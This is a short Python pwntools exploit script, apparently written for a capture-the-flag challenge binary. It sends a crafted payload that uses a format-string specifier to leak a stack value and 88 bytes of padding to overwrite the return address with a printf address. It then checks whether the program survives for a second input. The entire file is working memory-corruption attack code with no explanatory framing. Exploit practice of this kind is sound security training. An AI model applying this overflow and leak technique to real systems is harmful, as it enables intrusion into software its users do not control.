#!/usr/bin/env python3
import os,time
os.environ["TERM"]="xterm"
from pwn import *
context.log_level="error"
PRINTF=0x4010d4
p=process("/work/waf/waf/chal_remote")
p.recvuntil(b">> ")
# leak, then see if program loops (prints >> again) or crashes
pay=(b"exit"+b"[%26$p]").ljust(88,b"A")+p64(PRINTF)
p.send(pay)
time.sleep(0.3)
try:
    out=p.recv(timeout=1)
    print("after leak:", out[:120])
    # try sending another line
    p.send(b"exit\n")
    time.sleep(0.2)
    out2=p.recv(timeout=1)
    print("after 2nd send:", out2[:120])
except Exception as e:
    print("exc:", e)
p.close()
